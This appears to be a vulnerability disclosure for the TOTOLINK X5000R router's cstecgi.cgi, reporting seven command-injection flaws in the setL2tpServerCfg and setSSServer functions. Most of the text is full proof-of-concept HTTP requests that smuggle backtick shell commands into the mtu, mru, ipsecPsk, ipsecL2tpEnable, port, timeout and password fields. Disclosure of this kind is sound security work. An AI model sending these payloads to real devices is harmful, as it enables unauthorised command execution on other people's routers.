Vendor of Product: TOTOLINK X5000R - V9.1.0cu.2350_B20230313 (As of April 2, 2024, the latest version provided on the official website (https://www.totolink.net/) is available. )
Affected Component: The affected component is the file "cstecgi.cgi" located in the directory "/web/cgi-bin”.

Vulnerability 1-4:

TOTOLINK X5000R  V9.1.0cu.2350_B20230313 was discovered to contain a command injection vulnerability via the ‘mtu’, “mru”, “ipsecPsk” or the “ ipsecL2tpEnable" parameter in the setL2tpServerCfg function at /cgi-bin/cstecgi.cgi.

To exploit this vulnerability, someone only needs to craft a carefully prepared packet.Here is the specific exploitation process. Firstly, it is necessary to login to the device, then goto the http://192.168.0.1/advance/l2tp.html. It contains a command injection via the “mtu”、”mru”, “ipsecL2tpEnable” and “ipsecPsk” parameter. For example, post a data like this 

POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 272
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/advance/l2tp.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"enable":"1","sip":"10.8.0.2","eip":"10.8.0.51","server":"10.8.0.1","priDns":"8.8.8.8","secDns":"10.20.0.1","mtu":”1450`ls>/tmp/1`","mru":"1450`ls>/tmp/2`","ipsecL2tpEnable":"1`ls>/tmp/3`","ipsecPsk":"abbbababbababab`ls>/tmp/4`","topicurl":"setL2tpServerCfg","token":"*”}

  

Vulnerability 5-7:

TOTOLINK X5000R  V9.1.0cu.2350_B20230313 was discovered to contain a command injection vulnerability via the ‘password’, “port” or the “timeout" parameter in the setSSServer function at /cgi-bin/cstecgi.cgi.

Exploit like this : 


POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 225
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/advance/shadowsocks.html?timestamp=1712493894892
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"enable":"1","port":”8388`ls>/tmp/1`","timeout":"120`ls>/tmp/2`","password":"adminadmin`ls>/tmp/3`","encryption":"rc4-md5","udpFlag":"0","topicurl":"setSSServer","token":"990bf4b7ea129452ed7f8ce58cbabc83"}
